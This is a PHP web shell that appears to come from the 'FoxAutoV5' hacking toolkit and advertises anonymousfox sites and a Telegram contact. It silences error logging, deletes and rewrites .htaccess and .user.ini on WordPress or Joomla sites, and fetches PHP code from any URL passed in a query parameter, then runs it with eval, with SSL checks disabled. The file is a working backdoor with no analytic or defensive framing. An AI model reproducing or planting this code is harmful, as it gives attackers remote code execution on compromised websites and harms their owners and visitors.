<?php error_reporting(0);
 @ini_set('error_log', NULL);
 @ini_set('log_errors', 0);
  @ini_set('display_errors', 0);
  echo "FoxAutoV5 [The best tool]<br>Download: anonymousfox.co , <script type='text/javascript'>document.write(unescape('%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'))</script> , anonymousfox.net<br>Telegram: @Anonymous_Fox\n";
 if (isset($_GET["403"])){ $htaccess = base64_decode("IyBCRUdJTgo8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4KUmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlQmFzZSAvClJld3JpdGVSdWxlIF5pbmRleC5waHAkIC0gW0xdClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1mClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kClJld3JpdGVSdWxlIC4gaW5kZXgucGhwIFtMXQo8L0lmTW9kdWxlPgojIEVORAo="); 
/*$htaccess
# BEGIN
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . index.php [L]
</IfModule>
# END
*/
 if (file_exists("$root/wp-config.php") && file_exists("$root/.htaccess")){ unlink("$root/.htaccess");
 if (function_exists('file_put_contents')) { file_put_contents("$root/.htaccess",$htaccess);
 }else{ fwrite(fopen("$root/.htaccess","w"),$htaccess);
} }elseif (file_exists("$root/configuration.php") && file_exists("$root/.htaccess")){ unlink("$root/.htaccess");
 if (function_exists('file_put_contents')) { file_put_contents("$root/.htaccess",$htaccess);
 }else{ fwrite(fopen("$root/.htaccess","w"),$htaccess);
 } } if (file_exists("$root/.user.ini")){ unlink("$root/.user.ini");
 }  } $code = 'http://'.$_GET["php"];
 $t = "<token>000000000</token>";
 if (empty($code) or !stristr($code, "http")){ exit;
 } else { $php=file_get_contents($code);
 if (empty($php)){ $php = curl($code);
 } $php=str_replace("<?php", "", $php);
 $php=str_replace("?>", "", $php);
 eval($php);
 } function curl($url) { $curl = curl_init();
 curl_setopt($curl, CURLOPT_TIMEOUT, 40);
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
 curl_setopt($curl, CURLOPT_URL, $url);
 curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0;
 WOW64;
 rv:43.0) Gecko/20100101 Firefox/43.0");
 curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE);
 if (stristr($url,"https://")) { curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
 } curl_setopt($curl, CURLOPT_HEADER, false);
 return curl_exec ($curl);
 } ?>